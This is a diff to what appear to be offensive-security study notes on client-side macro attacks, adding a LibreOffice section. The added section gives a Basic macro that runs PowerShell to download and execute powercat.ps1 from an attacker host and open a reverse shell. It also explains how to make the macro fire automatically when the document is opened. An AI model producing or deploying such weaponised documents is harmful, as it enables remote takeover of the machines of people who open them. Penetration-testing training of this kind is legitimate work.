@@ -1,5 +1,6 @@
-# Client Side Attacks - .doc Macros
+# Macros
 
+## .doc
 
 Problem:
 We need to make a .doc document with a macro that creates a reverse shell.
@@ -59,3 +60,22 @@ End Sub
 
 Now it is *IMPORTANT* to save the macro _on the document_ rather than in the projects of the MS Office on the machine.
 So when going into MS Word, choose --> View --> Macros --> choose your document in the dropdown --> choose "create".
+
+## LibreOffice
+
+
+LibreOffice Macros are created by creating a .odt file on the attackbox and doesn't require a Windows VM.
+In a LibreOffice document go to Tools --> Organize Macros --> Basic. Now click on the Document --> Standard --> New.
+As the syntax is slightly different, the payload will also be.
+Here, we simply use the following payload in the Main function:
+
+
+```
+Sub Main
+	Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_WEB_PORT}/powercat.ps1');powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell")
+End Sub
+```
+
+This should download and execute powercat.
+Now, you save the macro, go to Tools --> Customize --> Events --> Open Document.
+In the resulting popup, go under the document, click the macro and click 'OK'.
